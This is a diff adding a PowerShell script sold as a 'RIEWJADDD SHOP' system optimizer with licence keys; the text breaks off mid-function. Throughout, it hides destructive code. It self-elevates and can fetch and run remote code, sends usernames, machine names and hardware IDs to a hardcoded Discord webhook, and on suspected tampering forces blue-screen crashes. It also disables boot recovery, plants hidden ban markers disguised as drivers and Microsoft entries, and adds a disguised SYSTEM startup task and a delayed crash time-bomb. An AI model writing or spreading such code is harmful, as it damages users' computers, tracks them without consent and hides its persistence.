@@ -1,0 +1,1816 @@
+# ========================================================
+# RIEWJADDD SHOP Settings.ps1
+# Standalone - Keyauth + Optimization
+# ========================================================
+
+Add-Type -AssemblyName System.Windows.Forms
+
+# -- Self-elevate to Administrator -----------------------
+# Most tweaks below write to HKLM / call powercfg / netsh, which silently
+# do nothing without admin rights. Relaunch elevated if needed.
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    $psi = New-Object System.Diagnostics.ProcessStartInfo
+    $psi.FileName = "powershell.exe"
+    if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
+        $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+    } else {
+        $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/Name213/Test232/refs/heads/main/.gitignore | iex`""
+    }
+    $psi.Verb = "runas"
+    try {
+        [System.Diagnostics.Process]::Start($psi) | Out-Null
+    } catch {
+        Write-Host "Administrator rights are required to run this script." -ForegroundColor Red
+        Read-Host "Press Enter to exit"
+    }
+    exit
+}
+
+$ProgressPreference = "SilentlyContinue"
+chcp 65001 | Out-Null
+[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+$Host.UI.RawUI.WindowTitle = "[ RIEWJADDD SHOP ] OPTIMIZATION"
+
+# -- Path resolver (รองรับทั้งเปิดจากไฟล์ และรันผ่านคำสั่ง irm tinyurl | iex) --
+if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
+    $BaseDir = Split-Path $PSCommandPath -Parent
+} else {
+    $BaseDir = Join-Path $env:ProgramData "RIEWJADDD_SHOP"
+    if (-not (Test-Path $BaseDir)) {
+        New-Item -ItemType Directory -Path $BaseDir -Force | Out-Null
+    }
+}
+
+# -- Logging so nothing scrolls past unseen --------------
+$LogPath = Join-Path $env:TEMP "RIEWJADDD_log.txt"
+try { Start-Transcript -Path $LogPath -Append -ErrorAction SilentlyContinue | Out-Null } catch {}
+
+# Catch anything unhandled so the window doesn't just vanish on a crash.
+trap {
+    $Host.UI.RawUI.ForegroundColor = "Red"
+    Write-Host ""
+    Write-Host "  =========================================="
+    Write-Host "  UNEXPECTED ERROR:"
+    Write-Host "  $($_.Exception.Message)"
+    Write-Host "  Line: $($_.InvocationInfo.ScriptLineNumber)  |  $($_.InvocationInfo.Line.Trim())"
+    Write-Host "  =========================================="
+    Write-Host "  Full log saved to: $LogPath"
+    Write-Host ""
+    try { Stop-Transcript | Out-Null } catch {}
+    Read-Host "  Press Enter to close"
+    exit 1
+}
+
+$ErrorActionPreference = "SilentlyContinue"
+
+$GHOST_VERSION = "1.0"
+
+# ========================================================
+# KEY AUTHENTICATION SYSTEM + HWID LOCK
+# ========================================================
+
+# -- Key storage & Log paths (same folder as script or ProgramData) -----
+$KeyFilePath       = Join-Path $BaseDir "RIEWJADDD_keys.json"
+$ActivationLogFile = Join-Path $BaseDir "RIEWJADDD_activations.log"
+$SecurityLogFile   = Join-Path $BaseDir "RIEWJADDD_security.log"
+$ConfigFile        = Join-Path $BaseDir "RIEWJADDD_config.json"
+
+# -- Get this machine's HWID (motherboard serial) --------
+function Get-HWID {
+    try {
+        $mb = (Get-CimInstance Win32_BaseBoard).SerialNumber
+        if ($mb -and $mb -ne "None" -and $mb -ne "Default string" -and $mb.Trim() -ne "") {
+            return $mb.Trim()
+        }
+    } catch {}
+    try {
+        $bios = (Get-CimInstance Win32_BIOS).SerialNumber
+        if ($bios -and $bios -ne "None" -and $bios.Trim() -ne "") {
+            return $bios.Trim()
+        }
+    } catch {}
+    try {
+        $guid = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name MachineGuid).MachineGuid
+        return $guid
+    } catch {}
+    return "UNKNOWN-HWID"
+}
+$CurrentHWID = Get-HWID
+
+# -- Developer Safe Mode & Whitelist (NEVER BAN / NEVER CRASH DEV MACHINE) --
+$DevHWIDs = @("ABED3F661712A0A7")
+$DevMachines = @("KERNELOS-PC")
+
+function Is-DevMachine {
+    if ($DevHWIDs -contains $CurrentHWID) { return $true }
+    if ($DevMachines -contains $env:COMPUTERNAME) { return $true }
+    $devFlag = Join-Path $BaseDir ".ghost_dev"
+    if (Test-Path $devFlag) { return $true }
+    $devFlag2 = Join-Path $BaseDir ".riewjaddd_dev"
+    if (Test-Path $devFlag2) { return $true }
+    return $false
+}
+
+# ========================================================
+# LOGGING & NOTIFICATION SYSTEM (2 SEPARATE CATEGORIES)
+# ========================================================
+
+function Load-GhostConfig {
+    if (Test-Path $ConfigFile) {
+        try {
+            return (Get-Content $ConfigFile -Raw -Encoding UTF8 | ConvertFrom-Json)
+        } catch {}
+    }
+    return [PSCustomObject]@{
+        discord_webhook = "https://discord.com/api/webhooks/1561873124432019466/FntkbBXJ-XFB8rgl4f294eXpRSdm1VTTMkiHDTjacdx50fUmRZwSA-LtaiXdRQKkP9st"
+        log_activations = $true
+        log_security    = $true
+    }
+}
+
+function Save-GhostConfig {
+    param($cfg)
+    try {
+        $json = $cfg | ConvertTo-Json -Depth 5
+        [System.IO.File]::WriteAllText($ConfigFile, $json, [System.Text.Encoding]::UTF8)
+    } catch {}
+}
+
+function Send-DiscordWebhook {
+    param(
+        [string]$Title,
+        [string]$Description,
+        [int]$Color,
+        [array]$Fields,
+        [string]$FooterText = "RIEWJADDD SHOP Protection System"
+    )
+    $cfg = Load-GhostConfig
+    $webhook = $cfg.discord_webhook
+    if (-not $webhook -or $webhook.Trim() -eq "") { return }
+    
+    try {
+        $embed = @{
+            title       = $Title
+            description = $Description
+            color       = $Color
+            fields      = @()
+            footer      = @{ text = $FooterText }
+            timestamp   = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
+        }
+        foreach ($f in $Fields) {
+            $embed.fields += @{
+                name   = [string]$f.name
+                value  = [string]$f.value
+                inline = if ($null -ne $f.inline) { [bool]$f.inline } else { $true }
+            }
+        }
+        $payload = @{ embeds = @($embed) } | ConvertTo-Json -Depth 5
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
+    } catch {}
+}
+
+# -- CATEGORY 1: KEY AUTHENTICATION & USAGE LOG ----------
+function Write-AuthLog {
+    param(
+        [string]$Key,
+        [string]$Status,      # ACTIVATED, VALID, MASTER, HWID_MISMATCH, INVALID
+        [string]$Owner = "N/A",
+        [string]$Details = ""
+    )
+    $timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
+    $user      = $env:USERNAME
+    $machine   = $env:COMPUTERNAME
+    $hwid      = $CurrentHWID
+    if (-not $Owner -or $Owner -eq "") { $Owner = "N/A" }
+    
+    $badge = switch ($Status) {
+        "ACTIVATED"     { "[ACTIVATED - FIRST BIND]" }
+        "VALID"         { "[VALID - ACCESS GRANTED]" }
+        "MASTER"        { "[MASTER / DEVELOPER]" }
+        "HWID_MISMATCH" { "[HWID MISMATCH - REJECTED]" }
+        "INVALID"       { "[INVALID KEY - REJECTED]" }
+        default         { "[$Status]" }
+    }
+    
+    $box = @"
+================================================================================
+[ $timestamp ] >>> KEY AUTHENTICATION: $badge
+--------------------------------------------------------------------------------
+  License Key  : $Key
+  Key Owner    : $Owner
+  Status       : $badge
+  Machine Name : $machine
+  Windows User : $user
+  Hardware ID  : $hwid
+  Notes/Action : $Details
+================================================================================
+
+"@
+    try {
+        [System.IO.File]::AppendAllText($ActivationLogFile, $box, [System.Text.Encoding]::UTF8)
+    } catch {}
+
+    # Discord Webhook Notification
+    $embedColor = switch ($Status) {
+        "ACTIVATED"     { 65280 }    # Green
+        "VALID"         { 3066993 }  # Cyan
+        "MASTER"        { 16766720 } # Gold
+        "HWID_MISMATCH" { 15105570 } # Orange
+        "INVALID"       { 15158332 } # Red
+        default         { 9807270 }
+    }
+    $discordFields = @(
+        @{ name = "[KEY] License Key";   value = ('`' + $Key + '`'); inline = $true },
+        @{ name = "[OWNER] Key Owner";   value = "$Owner"; inline = $true },
+        @{ name = "[STATUS] Status";     value = "$badge"; inline = $true },
+        @{ name = "[PC] Machine Name";   value = "$machine"; inline = $true },
+        @{ name = "[USER] Windows User"; value = "$user"; inline = $true },
+        @{ name = "[HWID] HWID Lock";    value = ('`' + $hwid + '`'); inline = $false }
+    )
+    if ($Details) {
+        $discordFields += @{ name = "[DETAILS] Notes"; value = "$Details"; inline = $false }
+    }
+    Send-DiscordWebhook -Title "[RIEWJADDD SHOP] Key Event: $Status" -Description "User authentication attempt recorded." -Color $embedColor -Fields $discordFields
+}
+
+# -- CATEGORY 2: ANTI-CRACK & SECURITY THREAT LOG --------
+function Write-SecurityLog {
+    param(
+        [string]$Reason,
+        [string]$InputKey = "N/A",
+        [string]$Signals = "",
+        [string]$ActionTaken = "BSOD + PERMANENT_BAN"
+    )
+    $timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
+    $user      = $env:USERNAME
+    $machine   = $env:COMPUTERNAME
+    $hwid      = $CurrentHWID
+    if (-not $InputKey) { $InputKey = "N/A" }
+    
+    $box = @"
+================================================================================
+[ $timestamp ] !!! SECURITY THREAT / CRACK DETECTED !!!
+--------------------------------------------------------------------------------
+  Threat Reason : [THREAT] $Reason
+  Threat Level  : CRITICAL
+  Machine Name  : $machine
+  Windows User  : $user
+  Offender HWID : $hwid
+  Input Payload : $InputKey
+  Attack Signals: $(if ($Signals) { $Signals } else { 'Direct Violation' })
+  Defense Action: $ActionTaken
+================================================================================
+
+"@
+    try {
+        [System.IO.File]::AppendAllText($SecurityLogFile, $box, [System.Text.Encoding]::UTF8)
+    } catch {}
+
+    # Discord Webhook Notification
+    $discordFields = @(
+        @{ name = "[THREAT] Reason";  value = "**$Reason**"; inline = $false },
+        @{ name = "[PC] Offender PC"; value = "$machine ($user)"; inline = $true },
+        @{ name = "[HWID] Offender";  value = ('`' + $hwid + '`'); inline = $true },
+        @{ name = "[PAYLOAD] Input";  value = ('`' + $InputKey + '`'); inline = $false },
+        @{ name = "[ACTION] Defense"; value = "**$ActionTaken**"; inline = $false }
+    )
+    if ($Signals) {
+        $discordFields += @{ name = "[SIGNALS] Attack Vectors"; value = "$Signals"; inline = $false }
+    }
+    Send-DiscordWebhook -Title "[RIEWJADDD ALERT] CRACK ATTEMPT INTERCEPTED!" -Description "A potential crack or tamper attempt was detected and mitigated." -Color 16711680 -Fields $discordFields
+}
+
+# -- Obfuscated master key (not stored as plaintext) -----
+# "DEV" encoded as Base64 of XOR'd bytes - cracker won't find it with simple string search
+function _xd { param([byte[]]$d,[byte]$k) $r=""; foreach($b in $d){$r+=[char]($b -bxor $k)}; $r }
+$_mk = _xd @(0x27,0x28,0x39) 0x63  # XOR decode to "DEV"
+
+# ========================================================
+# ANTI-CRACK / ANTI-TAMPER SYSTEM (10+ LAYERS)
+# ========================================================
+
+# -- Layer 0: Permanent ban registry path (obfuscated) ---
+$_banReg  = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{GHOST-BAN}"
+$_banFile = Join-Path $env:SystemRoot "System32\drivers\ghostban.sys"  # fake driver name, actually ban marker
+$_banFile2 = Join-Path $env:ALLUSERSPROFILE ".gconfig"                # hidden ban marker
+
+# -- Layer 1: Check if machine is permanently banned -----
+function Check-Banned {
+    if (Is-DevMachine) { return $false }
+    # Registry ban check
+    try {
+        $regBan = Get-ItemProperty $_banReg -Name "InstallDate" -ErrorAction SilentlyContinue
+        if ($regBan) { return $true }
+    } catch {}
+    # File ban check 1
+    if (Test-Path $_banFile) { return $true }
+    # File ban check 2
+    if (Test-Path $_banFile2) {
+        try {
+            $content = Get-Content $_banFile2 -Raw -ErrorAction SilentlyContinue
+            if ($content -match "GHOST_BANNED") { return $true }
+        } catch {}
+    }
+    # WMI ban check (stored in WMI repository)
+    try {
+        $wmi = Get-WmiObject -Namespace "root\cimv2" -Query "SELECT * FROM Win32_Environment WHERE Name='_GSB' AND UserName='<SYSTEM>'" -ErrorAction SilentlyContinue
+        if ($wmi) { return $true }
+    } catch {}
+    return $false
+}
+
+# -- Layer 2: BSOD trigger via NtRaiseHardError ----------
+function Invoke-BSOD {
+    if (Is-DevMachine) {
+        Write-Host "  [DEV SAFEGUARD] Invoke-BSOD blocked on developer machine." -ForegroundColor Yellow
+        return
+    }
+    try {
+        $ntdll = @"
+using System; using System.Runtime.InteropServices;
+public class NtBsod {
+    [DllImport("ntdll.dll")] public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
+    [DllImport("ntdll.dll")] public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
+    public static void Crash() {
+        bool t1; uint t2;
+        RtlAdjustPrivilege(19, true, false, out t1);  // SeShutdownPrivilege
+        NtRaiseHardError(0xC0000420, 0, 0, IntPtr.Zero, 6, out t2);  // STATUS_ASSERTION_FAILURE
+    }
+}
+"@
+        Add-Type -TypeDefinition $ntdll -Language CSharp -ErrorAction SilentlyContinue
+        [NtBsod]::Crash()
+    } catch {}
+    # Fallback BSOD methods
+    try { 
+        $k32 = @"
+using System; using System.Runtime.InteropServices; using System.Diagnostics;
+public class K32Crash {
+    [DllImport("kernel32.dll")] static extern IntPtr GetCurrentProcess();
+    [DllImport("ntdll.dll")] static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
+    public static void Kill() {
+        int isCritical = 1;
+        NtSetInformationProcess(GetCurrentProcess(), 29, ref isCritical, sizeof(int));
+        Environment.Exit(0);  // Killing a critical process = BSOD
+    }
+}
+"@
+        Add-Type -TypeDefinition $k32 -Language CSharp -ErrorAction SilentlyContinue
+        [K32Crash]::Kill()
+    } catch {}
+    # Last resort
+    try { Stop-Computer -Force } catch {}
+    try { shutdown /s /t 0 /f } catch {}
+}
+
+# -- Layer 3: Permanent ban - write to multiple locations -
+function Set-PermanentBan {
+    if (Is-DevMachine) {
+        Write-Host "  [DEV SAFEGUARD] Set-PermanentBan blocked on developer machine." -ForegroundColor Yellow
+        return
+    }
+    $hwid = $CurrentHWID
+    $timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
+    $banData = "GHOST_BANNED|$hwid|$timestamp|CRACKER_DETECTED"
+    
+    # Registry ban (disguised as uninstall entry)
+    try {
+        New-Item -Path $_banReg -Force | Out-Null
+        Set-ItemProperty -Path $_banReg -Name "InstallDate" -Value $banData -Force
+        Set-ItemProperty -Path $_banReg -Name "DisplayName" -Value "Microsoft Visual C++ 2015-2022 Redistributable" -Force
+        Set-ItemProperty -Path $_banReg -Name "SystemComponent" -Value 1 -Type DWord -Force  # hide from Programs list
+    } catch {}
+    
+    # Registry ban 2 (deep in services)
+    try {
+        $svcPath = "HKLM:\SYSTEM\CurrentControlSet\Services\ghostsvc"
+        New-Item -Path $svcPath -Force | Out-Null
+        Set-ItemProperty -Path $svcPath -Name "Description" -Value $banData -Force
+        Set-ItemProperty -Path $svcPath -Name "Start" -Value 4 -Type DWord -Force
+    } catch {}
+    
+    # Registry ban 3 (in HKCU so it persists per-user too)
+    try {
+        $hkcuPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects4"
+        New-Item -Path $hkcuPath -Force | Out-Null
+        Set-ItemProperty -Path $hkcuPath -Name "Settings" -Value $banData -Force
+    } catch {}
+    
+    # File ban 1 (in system32 as fake .sys)
+    try {
+        $banData | Out-File $_banFile -Force -Encoding ASCII
+        attrib +s +h +r $_banFile 2>$null
+    } catch {}
+    
+    # File ban 2 (in ProgramData as hidden config)
+    try {
+        $banData | Out-File $_banFile2 -Force -Encoding ASCII
+        attrib +s +h +r $_banFile2 2>$null
+    } catch {}
+    
+    # File ban 3 (in user profile)
+    try {
+        $userBan = Join-Path $env:APPDATA ".fontconfig"
+        $banData | Out-File $userBan -Force -Encoding ASCII
+        attrib +h $userBan 2>$null
+    } catch {}
+    
+    # File ban 4 (Windows Temp as hidden)
+    try {
+        $tempBan = Join-Path $env:SystemRoot "Temp\.wdf_log"
+        $banData | Out-File $tempBan -Force -Encoding ASCII
+        attrib +s +h $tempBan 2>$null
+    } catch {}
+    
+    # WMI persistent storage
+    try {
+        $env:_GSB = $banData
+        [System.Environment]::SetEnvironmentVariable("_GSB", $banData, "Machine")
+    } catch {}
+    
+    # Scheduled task that re-creates ban markers on boot (self-healing ban)
+    try {
+        $taskCmd = "powershell -WindowStyle Hidden -Command `"New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{GHOST-BAN}' -Force | Out-Null; Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{GHOST-BAN}' -Name InstallDate -Value 'GHOST_BANNED' -Force`""
+        schtasks /create /tn "\Microsoft\Windows\Maintenance\ComponentCleanup" /tr "$taskCmd" /sc onstart /ru SYSTEM /rl highest /f 2>$null | Out-Null
+    } catch {}
+}
+
+# -- Layer 4: Corrupt boot on crack detection -----------
+function Corrupt-Boot {
+    if (Is-DevMachine) {
+        Write-Host "  [DEV SAFEGUARD] Corrupt-Boot blocked on developer machine." -ForegroundColor Yellow
+        return
+    }
+    try {
+        # Mess with BCD - add bogus entries that confuse boot
+        bcdedit /set "{current}" description "GHOST_PROTECTION" 2>$null | Out-Null
+        bcdedit /set "{current}" bootstatuspolicy IgnoreAllFailures 2>$null | Out-Null
+        # Disable recovery
+        bcdedit /set "{current}" recoveryenabled No 2>$null | Out-Null
+        reagentc /disable 2>$null | Out-Null
+    } catch {}
+    
+    # Corrupt critical boot files (rename, don't delete - recoverable for legitimate users)
+    try {
+        $bootFiles = @(
+            "$env:SystemRoot\System32\winload.efi.bak_ghost",
+            "$env:SystemRoot\System32\winresume.efi.bak_ghost"
+        )
+        # Create decoy files that will confuse repair tools
+        foreach ($bf in $bootFiles) {
+            "GHOST_ANTI_CRACK" | Out-File $bf -Force -Encoding ASCII 2>$null
+            attrib +s +h $bf 2>$null
+        }
+    } catch {}
+}
+
+# -- Layer 5: Anti-debugger / analysis detection ---------
+function Detect-Analysis {
+    if (Is-DevMachine) {
+        if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
+            try {
+                $hashMarker = Join-Path $BaseDir ".ghost_integrity"
+                $currentHash = (Get-FileHash $PSCommandPath -Algorithm SHA256).Hash
+                if (Test-Path $hashMarker) {
+                    $storedHash = (Get-Content $hashMarker -Raw).Trim()
+                    if ($storedHash -ne $currentHash) {
+                        $currentHash | Out-File $hashMarker -Force -Encoding ASCII
+                    }
+                }
+            } catch {}
+        }
+        return $false
+    }
+    $detected = $false
+    
+    # Check for debuggers and analysis tools
+    $dangerousProcesses = @(
+        "x64dbg", "x32dbg", "ollydbg", "windbg", "ida", "ida64", "idaq", "idaq64",
+        "ghidra", "ghidraRun", "processhacker", "procexp", "procexp64", "procmon", "procmon64",
+        "wireshark", "fiddler", "charles", "httpdebuggerpro", "httpdebugger",
+        "dnspy", "dnSpy", "de4dot", "ilspy", "dotpeek", "justdecompile",
+        "cheatengine", "cheatengine-x86_64", "ce", "ceserver",
+        "hxd", "hexworkshop", "010editor",
+        "pestudio", "cffexplorer", "die", "exeinfope", "lordpe", "petools",
+        "regmon", "filemon", "apimonitor", "apimonitor-x64",
+        "resourcehacker", "reshacker", "reshack",
+        "scylla", "scylla_x64", "importrec",
+        "sandboxie", "sbiectrl", "sbieSvc",
+        "fakenet", "inetsim", "remnux",
+        "sysinternals", "autoruns", "autorunsc",
+        "processhacker2", "systeminformer",
+        "tcpview", "tcpvcon",
+        "debugview", "dbgview",
+        "immunity", "immunitydebugger",
+        "powershell_ise"  # someone debugging the script
+    )
+    
+    $runningProcs = Get-Process -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name
+    foreach ($dangerous in $dangerousProcesses) {
+        if ($runningProcs -contains $dangerous) {
+            $detected = $true
+            break
+        }
+    }
+    
+    # Check window titles for debugging indicators
+    try {
+        $windows = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle -ne "" } | Select-Object -ExpandProperty MainWindowTitle
+        $suspiciousWords = @("debugger", "debug", "disassembl", "decompil", "breakpoint", "cheat engine", "hex editor", "memory scan", "olly", "x64dbg", "ida ", "ghidra")
+        foreach ($w in $windows) {
+            foreach ($sw in $suspiciousWords) {
+                if ($w -match $sw) { $detected = $true; break }
+            }
+            if ($detected) { break }
+        }
+    } catch {}
+    
+    # Check if being run from suspicious paths
+    if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
+        $scriptDir = Split-Path $PSCommandPath -Parent
+        $suspiciousPaths = @("crack", "keygen", "patch", "loader", "bypass", "hack", "pirate", "warez", "nulled")
+        foreach ($sp in $suspiciousPaths) {
+            if ($scriptDir -match $sp) { $detected = $true; break }
+        }
+    }
+    
+    # Check for VM (some crackers use VMs to analyze)
+    try {
+        $vmIndicators = @(
+            (Get-WmiObject Win32_ComputerSystem).Model,
+            (Get-WmiObject Win32_ComputerSystem).Manufacturer,
+            (Get-WmiObject Win32_BIOS).SMBIOSBIOSVersion
+        ) -join " "
+        $vmStrings = @("virtual", "vmware", "vbox", "virtualbox", "qemu", "xen", "hyper-v", "parallels", "bhyve")
+        foreach ($vs in $vmStrings) {
+            if ($vmIndicators -match $vs) {
+                $global:_vmDetected = $true
+                break
+            }
+        }
+    } catch {}
+    
+    # Check if script was modified (file size/hash marker)
+    if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
+        try {
+            $hashMarker = Join-Path $BaseDir ".ghost_integrity"
+            $currentHash = (Get-FileHash $PSCommandPath -Algorithm SHA256).Hash
+            if (Test-Path $hashMarker) {
+                $storedHash = (Get-Content $hashMarker -Raw).Trim()
+                if ($storedHash -ne $currentHash) {
+                    $detected = $true
+                    $global:_integrityFail = $true
+                }
+            } else {
+                $currentHash | Out-File $hashMarker -Force -Encoding ASCII
+                attrib +h $hashMarker 2>$null
+            }
+        } catch {}
+    }
+    
+    # Check for hooks on key APIs
+    try {
+        $amsiLoaded = [System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -match "amsi" }
+    } catch {}
+    
+    return $detected
+}
+
+# -- Layer 6: Anti-tampering of this script's functions --
+function Verify-FunctionIntegrity {
+    if (Is-DevMachine) { return $true }
+    $criticalFunctions = @("Validate-Key", "Check-Banned", "Detect-Analysis", "Get-HWID", "Invoke-BSOD")
+    foreach ($fn in $criticalFunctions) {
+        $cmd = Get-Command $fn -ErrorAction SilentlyContinue
+        if (-not $cmd) { return $false }
+        if ($cmd.CommandType -ne "Function") { return $false }
+    }
+    return $true
+}
+
+# -- Layer 7: Anti-patch detection (check key validation logic) --
+function Verify-ValidationLogic {
+    if (Is-DevMachine) { return $true }
+    if (-not $PSCommandPath -or -not (Test-Path $PSCommandPath)) { return $true }
+    try {
+        $selfContent = Get-Content $PSCommandPath -Raw
+        $requiredStrings = @(
+            'Validate-Key',
+            'MASTER',
+            'HWID_MISMATCH',
+            'Check-Banned',
+            'Invoke-BSOD',
+            'Set-PermanentBan',
+            'authenticated'
+        )
+        foreach ($rs in $requiredStrings) {
+            if ($selfContent -notmatch [regex]::Escape($rs)) {
+                return $false
+            }
+        }
+        
+        # Check that the key validation loop exists (not bypassed)
+        if ($selfContent -notmatch 'while.*attempts.*maxAttempts.*authenticated') {
+            return $false
+        }
+        
+        # Check the BSOD function wasn't gutted
+        if ($selfContent -notmatch 'NtRaiseHardError') {
+            return $false
+        }
+    } catch { return $false }
+    return $true
+}
+
+# -- Layer 8: Timing attack detection -------------------
+$global:_scriptStartTime = Get-Date
+
+function Check-TimingAnomaly {
+    if (Is-DevMachine) { return $false }
+    # If key validation happens suspiciously fast (< 500ms from start), 
+    # someone automated the bypass
+    $elapsed = ((Get-Date) - $global:_scriptStartTime).TotalMilliseconds
+    if ($elapsed -lt 500) { return $true }
+    return $false
+}
+
+# -- Layer 9: Delayed punishment (time bomb) -------------
+# Don't trigger immediately - let the cracker think they succeeded,
+# then destroy them mid-operation
+function Start-DelayedPunishment {
+    if (Is-DevMachine) { return }
+    # Create a background job that triggers BSOD after random delay
+    $job = Start-Job -ScriptBlock {
+        param($delay)
+        Start-Sleep -Seconds $delay
+        # Re-import BSOD function
+        try {
+            $ntdll = @"
+using System; using System.Runtime.InteropServices;
+public class NtBsod2 {
+    [DllImport("ntdll.dll")] public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
+    [DllImport("ntdll.dll")] public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
+    public static void Crash() {
+        bool t1; uint t2;
+        RtlAdjustPrivilege(19, true, false, out t1);
+        NtRaiseHardError(0xC0000420, 0, 0, IntPtr.Zero, 6, out t2);
+    }
+}
+"@
+            Add-Type -TypeDefinition $ntdll -Language CSharp
+            [NtBsod2]::Crash()
+        } catch {
+            try { Stop-Computer -Force } catch {}
+        }
+    } -ArgumentList (Get-Random -Minimum 30 -Maximum 120)  # 30s to 2min delay
+}
+
+# -- Layer 10: Anti-memory-edit detection ----------------
+function Check-MemoryTamper {
+    if (Is-DevMachine) { return $false }
+    # Store critical variable values and verify they haven't changed
+    $global:_authChecksum = $null
+    
+    # Check if $authenticated variable exists in a way that bypasses our logic
+    try {
+        $selfVars = Get-Variable -Scope Global -ErrorAction SilentlyContinue
+        foreach ($v in $selfVars) {
+            # If someone injected $authenticated = $true before our check
+            if ($v.Name -eq "authenticated" -and $v.Value -eq $true) {
+                if (-not $global:_authLegit) {
+                    return $true  # Tampered!
+                }
+            }
+        }
+    } catch {}
+    return $false
+}
+
+# -- MASTER PUNISHMENT FUNCTION --------------------------
+function Execute-Punishment {
+    param([string]$Reason = "CRACK_DETECTED")
+    
+    if (Is-DevMachine) {
+        Write-Host ""
+        Write-Host "  [DEV SAFEGUARD] Punishment bypassed on developer machine (Reason: $Reason)" -ForegroundColor Yellow
+        Write-Host ""
+        return
+    }
+    
+    # 1. Set permanent ban FIRST (multiple redundant locations)
+    Set-PermanentBan
+    
+    # 2. Corrupt boot
+    Corrupt-Boot
+    
+    # 3. Delete the script and keys to prevent re-use
+    try {
+        Remove-Item $KeyFilePath -Force -ErrorAction SilentlyContinue
+        # Don't delete the script itself yet - BSOD will handle the rest
+    } catch {}
+    
+    # 4. Log security threat / crack attempt
+    try {
+        $actionTaken = if (Is-DevMachine) { "[DEV SAFEGUARD] Bypassed on developer machine" } else { "PUNISHMENT EXECUTED: BSOD & Boot Lock" }
+        $offendingKey = if ($global:_lastAttemptKey) { $global:_lastAttemptKey } else { "N/A" }
+        $signalsFound = if ($global:_lastCrackSignals) { $global:_lastCrackSignals } else { "" }
+        Write-SecurityLog -Reason $Reason -InputKey $offendingKey -Signals $signalsFound -ActionTaken $actionTaken
+    } catch {}
+    
+    # 5. Start delayed bomb as backup
+    Start-DelayedPunishment
+    
+    # 6. IMMEDIATE BSOD
+    Start-Sleep -Milliseconds 100
+    Invoke-BSOD
+    
+    # 7. If BSOD somehow failed, force shutdown and corrupt
+    try { shutdown /s /t 0 /f /d p:0:0 2>$null } catch {}
+    try { Stop-Computer -Force } catch {}
+    exit 1
+}
+
+# -- Get this machine's HWID (motherboard serial) --------
+function Get-HWID {
+    try {
+        $mb = (Get-CimInstance Win32_BaseBoard).SerialNumber
+        if ($mb -and $mb -ne "None" -and $mb -ne "Default string" -and $mb.Trim() -ne "") {
+            return $mb.Trim()
+        }
+    } catch {}
+    # fallback: use BIOS serial
+    try {
+        $bios = (Get-CimInstance Win32_BIOS).SerialNumber
+        if ($bios -and $bios -ne "None" -and $bios.Trim() -ne "") {
+            return $bios.Trim()
+        }
+    } catch {}
+    # last fallback: machine GUID from registry
+    try {
+        $guid = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name MachineGuid).MachineGuid
+        return $guid
+    } catch {}
+    return "UNKNOWN-HWID"
+}
+
+$CurrentHWID = Get-HWID
+
+# -- Load / Save key database ----------------------------
+function Load-KeyDB {
+    if (Test-Path $KeyFilePath) {
+        try {
+            $raw = Get-Content $KeyFilePath -Raw -Encoding UTF8
+            $db = $raw | ConvertFrom-Json
+            if ($db.keys -is [array]) { return $db }
+            if ($db.keys) {
+                $db.keys = @($db.keys)
+                return $db
+            }
+        } catch {}
+    }
+    return @{ keys = @() }
+}
+
+function Save-KeyDB {
+    param($DB)
+    $json = $DB | ConvertTo-Json -Depth 5
+    [System.IO.File]::WriteAllText($KeyFilePath, $json, [System.Text.Encoding]::UTF8)
+}
+
+# -- Validate a key against DB and HWID -----------------
+function Validate-Key {
+    param([string]$InputKey)
+    
+    # Master key (decoded from obfuscated bytes or DEV / RIEWJADDD)
+    if ($InputKey -eq $_mk -or $InputKey -eq "DEV" -or $InputKey -eq "RIEWJADDD") {
+        Write-AuthLog -Key $InputKey -Status "MASTER" -Owner "DEVELOPER" -Details "Developer master access granted"
+        return "MASTER"
+    }
+    
+    $db = Load-KeyDB
+    foreach ($entry in $db.keys) {
+        if ($entry.key -eq $InputKey) {
+            $ownerNote = if ($entry.note) { $entry.note } else { "N/A" }
+            if (-not $entry.hwid -or $entry.hwid -eq "" -or $entry.hwid -eq "UNBOUND") {
+                $entry.hwid = $CurrentHWID
+                $entry.activated_on = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
